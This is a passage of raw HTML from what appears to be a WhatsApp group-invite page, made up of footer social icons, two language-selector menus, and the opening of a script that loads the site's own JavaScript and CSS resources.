7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z"
                                                fill="currentColor"></path>
                                        </svg></a><a aria-label="Facebook"
                                        href="https://www.facebook.com/profile.php?id=100064758844406"
                                        class="_afwh _adig _ad_c" target="_blank" rel="noopener"><svg width="11"
                                            height="21" viewBox="0 0 11 21" fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                            class="_wauiIcon__facebook-alt _adid _afbl">
                                            <path
                                                d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z"
                                                fill="currentColor"></path>
                                        </svg></a></div>
                            </span><span class="_aeom">
                                <div class="_9bhp _9bhq _9bhs _9bhv _afoo">
                                    <div class="_afoa"><select id="u_0_9_0k" class="_9tg0 _afo4 _afon">
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">
                                                Azərbaycan</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">
                                                Afrikaans</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">Bahasa
                                                Indonesia</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">Melayu
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">Català
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">čeština
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">Dansk
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">Deutsch
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">Eesti
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en">English
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">Español
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">Français
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">Gaeilge
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">Hrvatski
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">Italiano
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">
                                                Kiswahili</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">Latviešu
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">Lietuvių
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">Magyar
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">
                                                Nederlands</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">Norsk
                                                bokmål</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">O‘zbek
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">Filipino
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">Polski
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">
                                                Português (Brasil)</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">
                                                Português (Portugal)</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">Română
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">Shqip
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">
                                                Slovenčina</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">
                                                Slovenščina</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">Suomi
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">Svenska
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">Tiếng
                                                Việt</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">Türkçe
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">Ελληνικά
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">
                                                български</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">қазақ
                                                тілі</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">
                                                македонски</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">русский
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">српски
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">
                                                українська</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">עברית
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar"
                                                selected="1">العربية</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">فارسی
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">اردو
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">বাংলা
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">हिन्दी
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">ગુજરાતી
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">ಕನ್ನಡ
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">मराठी
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">ਪੰਜਾਬੀ
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">தமிழ்
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">తెలుగు
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">മലയാളം
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">ไทย
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">简体中文
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">
                                                繁體中文（台灣）</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">
                                                繁體中文（香港）</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">日本語
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">한국어
                                            </option>
                                        </select><select id="u_0_a_dn" class="_9tg0 _afo4 _afoc">
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">
                                                azərbaycan</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">
                                                Afrikaans</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">Bahasa
                                                Indonesia</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">Melayu
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">català
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">čeština
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">dansk
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">Deutsch
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">eesti
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en">English
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">español
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">français
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">Gaeilge
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">hrvatski
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">italiano
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">
                                                Kiswahili</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">latviešu
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">lietuvių
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">magyar
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">
                                                Nederlands</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">norsk
                                                bokmål</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">o‘zbek
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">Filipino
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">polski
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">
                                                Português (Brasil)</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">
                                                Português (Portugal)</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">română
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">shqip
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">
                                                slovenčina</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">
                                                slovenščina</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">suomi
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">svenska
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">Tiếng
                                                Việt</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">Türkçe
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">Ελληνικά
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">
                                                български</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">қазақ
                                                тілі</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">
                                                македонски</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">русский
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">српски
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">
                                                українська</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">עברית
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar"
                                                selected="1">العربية</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">فارسی
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">اردو
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">বাংলা
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">हिन्दी
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">ગુજરાતી
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">ಕನ್ನಡ
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">मराठी
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">ਪੰਜਾਬੀ
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">தமிழ்
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">తెలుగు
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">മലയാളം
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">ไทย
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">简体中文
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">
                                                繁體中文（台灣）</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">
                                                繁體中文（香港）</option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">日本語
                                            </option>
                                            <option class="_afo9"
                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">한국어
                                            </option>
                                        </select><svg width="12" height="8" viewBox="0 0 12 8" fill="none"
                                            class="_a99- _afob">
                                            <path
                                                d="M1.41 -4.62904e-07L6 4.58L10.59 -6.16331e-08L12 1.41L6 7.41L-6.16331e-08 1.41L1.41 -4.62904e-07Z">
                                            </path>
                                        </svg></div>
                                </div>
                            </span></div>
                    </div>
                </footer>
            </div>
        </div>
    </div>
    <div></div>
    <script>
        requireLazy(["Bootloader"], function (m) { m.handlePayload({ "consistency": { "rev": 1007374203 }, "rsrcMap": { "LX1aYVl": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yZ\/r\/CBGEnxzDw4z.js?_nc_x=Ij3Wp8lg5Kz" }, "Af0v4Z0": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iJoa4\/yN\/l\/ar_AR\/4Hi6-Bc0Uff.js?_nc_x=Ij3Wp8lg5Kz" }, "aMZ15\/K": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yJ\/r\/7igDNpVHt03.js?_nc_x=Ij3Wp8lg5Kz" }, "my4T6B4": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yb\/r\/eISogb0tc0c.js?_nc_x=Ij3Wp8lg5Kz" }, "vXVmoSO": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yk\/r\/T7WxsqwR8rh.js?_nc_x=Ij3Wp8lg5Kz" }, "9G3hptj": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yG\/r\/eHq09KVbDQs.js?_nc_x=Ij3Wp8lg5Kz" }, "uW12T1t": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y9\/r\/4thXtY6F4n3.js?_nc_x=Ij3Wp8lg5Kz" }, "EqTnb+\/": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yV\/l\/1,cross\/eJmw6xQXE86.css?_nc_x=Ij3Wp8lg5Kz" }, "WRhAqCJ": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iVNN4\/yD\/l\/ar_AR\/yAWm_y2I0ga.js?_nc_x=Ij3Wp8lg5Kz" }, "zV8nP9g": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3ipoM4\/yG\/l\/ar_AR\/qa6FsvnfvaH.js?_nc_x=Ij3Wp8lg5Kz" }, "gjt0UlN": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3ivs-4\/y5\/l\/ar_AR\/VEyB2Ea7yw7.js?_nc_x=Ij3Wp8lg5Kz" }, "34IjhTr": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yz\/r\/zA6VNgnjWOm.js?_nc_x=Ij3Wp8lg5Kz" }, "a2YBUdi": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ys\/r\/ioxK2Ojkb1E.js?_nc_x=Ij3Wp8lg5Kz" }, "iqaNd7v": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y9\/r\/0sm6BuV2M9-.js?_nc_x=Ij3Wp8lg5Kz" }, "DS80Qf6": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yZ\/r\/PXMqPA6gfbx.js?_nc_x=Ij3Wp8lg5Kz" }, "lYMIqwV": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/Cekb95ZEenT.js?_nc_x=Ij3Wp8lg5Kz" }, "anQXi\/0": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yI\/r\/eGG7TkDIBnC.js?_nc_x=Ij3Wp8lg5Kz" }, "5tesmBe": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iJD64\/y6\/l\/ar_AR\/Ew6CX66a87i.js?_nc_x=Ij3Wp8lg5Kz" }, "R5w1rCJ": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/p55HfXW__mM.js?_nc_x=Ij3Wp8lg5Kz" }, "3v0vBAN": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yb\/l\/1,cross\/ui22MTwmdhg.css?_nc_x=Ij3Wp8lg5Kz" }, "vQ2oxzP": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3ipak4\/yz\/l\/ar_AR\/rpAfkggT8Ce.js?_nc_x=Ij3Wp8lg5Kz" }, "IsaKnm5": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3imVS4\/yl\/l\/ar_AR\/ybct1qwwOsd.js?_nc_x=Ij3Wp8lg5Kz" }, "rlbiS2R": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yZ\/r\/MT8zVb7FCG1.js?_nc_x=Ij3Wp8lg5Kz" }, "+2mYsBo": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yd\/r\/ACVCSlW0ASp.js?_nc_x=Ij3Wp8lg5Kz" }, "K7ursti": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yB\/l\/1,cross\/6P9qnDTA_gX.css?_nc_x=Ij3Wp8lg5Kz" }, "K95O88f": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yP\/l\/1,cross\/lWnEyOwJPln.css?_nc_x=Ij3Wp8lg5Kz" }, "lGcuWFY": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3i7VN4\/yf\/l\/ar_AR\/nx75hWjql-h.js?_nc_x=Ij3Wp8lg5Kz" }, "MA7wtBb": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yS\/r\/lhPdogB16ty.js?_nc_x=Ij3Wp8lg5Kz" }, "mdAFoUs": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yw\/r\/_InhWGTbjG7.js?_nc_x=Ij3Wp8lg5Kz" }, "Cyo1q1h": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yM\/l\/1,cross\/9emYwFImFLT.css?_nc_x=Ij3Wp8lg5Kz" }, "WB+BRYy": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3i8dj4\/yd\/l\/ar_AR\/YyQx5yamlU5.js?_nc_x=Ij3Wp8lg5Kz" }, "Y3RUmNH": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iCkD4\/y0\/l\/ar_AR\/Q1CkWQ3GFhO.js?_nc_x=Ij3Wp8lg5Kz" }, "5QF1Vlf": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y0\/r\/BAtkspiwEE3.js?_nc_x=Ij3Wp8lg5Kz" }, "ZM\/66tK": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yQ\/r\/ARwosKhrsu6.js?_nc_x=Ij3Wp8lg5Kz" }, "vOJl9Mi": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yM\/r\/9mQLDhD4SMR.js?_nc_x=Ij3Wp8lg5Kz" }, "n+jECvZ": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yB\/r\/Hm3pirqUHEX.js?_nc_x=Ij3Wp8lg5Kz" }, "48r1VFg": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yb\/r\/IlftPGd0Jl6.js?_nc_x=Ij3Wp8lg5Kz" }, "ZWW+dax": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yu\/r\/yjnHX5v6vWx.js?_nc_x=Ij3Wp8lg5Kz" }, "S3KXb64": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/r\/_6UXzqL0TOc.js?_nc_x=Ij3Wp8lg5Kz" }, "VESpy09": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yj\/r\/WUS5EuOanS2.js?_nc_x=Ij3Wp8lg5Kz" }, "Ox\/z9Em": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yw\/r\/Zf3fUoDk7tZ.js?_nc_x=Ij3Wp8lg5Kz" }, "2UdiOZ8": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yL\/r\/UYR1psvcFia.js?_nc_x=Ij3Wp8lg5Kz" }, "hUDGDA4": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/muAuE9Qzu_b.js?_nc_x=Ij3Wp8lg5Kz" }, "dsf5Sdn": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yJ\/l\/1,cross\/pOLS7ZUdRFq.css?_nc_x=Ij3Wp8lg5Kz" }, "T3YJWJ1": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yg\/r\/Agswk3_mVhM.js?_nc_x=Ij3Wp8lg5Kz" }, "Et43WS9": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yH\/r\/zjzA5FCJi_y.js?_nc_x=Ij3Wp8lg5Kz" }, "hm7LH2C": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yZ\/r\/D-xA6UdYheu.js?_nc_x=Ij3Wp8lg5Kz" }, "aSbaNKt": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yC\/l\/1,cross\/1avUb7EfQ7B.css?_nc_x=Ij3Wp8lg5Kz" }, "M8Xp01T": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y-\/r\/kQV1nBAlQX2.js?_nc_x=Ij3Wp8lg5Kz" }, "YmFpgbD": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ya\/r\/H1K7LMsDAHj.js?_nc_x=Ij3Wp8lg5Kz" }, "mw0cRSV": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y5\/r\/YQvbpe7tqwt.js?_nc_x=Ij3Wp8lg5Kz" }, "s6f7kQQ": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yp\/r\/O4hV5R-_3aY.js?_nc_x=Ij3Wp8lg5Kz" }, "j8vinei": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y6\/r\/4mrA60sb1MG.js?_nc_x=Ij3Wp8lg5Kz" }, "yPN8Cty": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yb\/l\/1,cross\/wTkjE-OZYCu.css?_nc_x=Ij3Wp8lg5Kz" }, "GS4bGVX": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yv\/l\/1,cross\/Z0kO-hYCR0y.css?_nc_x=Ij3Wp8lg5Kz" }, "8q2zxdD": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yn\/l\/1,cross\/nmx-hzkaYTC.css?_nc_x=Ij3Wp8lg5Kz" }, "mDomTSa": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ya\/l\/1,cross\/5IMEy-bjfVY.css?_nc_x=Ij3Wp8lg5Kz" }, "8LpAtc0": { "type": "css", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yj\/l\/1,cross\/7GLqjeTorkr.css?_nc_x=Ij3Wp8lg5Kz" }, "NUcs7zk": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y0\/r\/TB7BkqoN_Ta.js?_nc_x=Ij3Wp8lg5Kz" }, "zuJ\/ghe": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ya\/r\/mPlT7RQMT5k.js?_nc_x=Ij3Wp8lg5Kz" }, "fUlW\/15": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yR\/r\/LweEqkrGkRz.js?_nc_x=Ij3Wp8lg5Kz" }, "zVTqSl6": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/r\/ytmG00L_PQ4.js?_nc_x=Ij3Wp8lg5Kz" }, "Y+PD8c3": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iouQ4\/yT\/l\/ar_AR\/GUm0_wffTPI.js?_nc_x=Ij3Wp8lg5Kz" }, "VgOUvrQ": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yY\/r\/KzP8exhJKC5.js?_nc_x=Ij3Wp8lg5Kz" }, "9EKSmsD": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yx\/r\/1vnPpAoMfu0.js?_nc_x=Ij3Wp8lg5Kz" }, "u5lyyOe": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yD\/r\/y_qH9-7mJY9.js?_nc_x=Ij3Wp8lg5Kz" }, "oPTgYNC": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yN\/r\/O6JuB_TyzY0.js?_nc_x=Ij3Wp8lg5Kz" }, "kw5YG6Z": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y2\/r\/lfPnTLV3uJ4.js?_nc_x=Ij3Wp8lg5Kz" }, "iXU77vs": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yT\/r\/PzOPmfKorEN.js?_nc_x=Ij3Wp8lg5Kz" }, "8pnRkHq": { "type": "js", "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yf\/r\/YZ0yoKxi5gz.js?_nc_x=Ij3Wp8lg5Kz" }, "a1GO+nL": { "type": "js", "src": 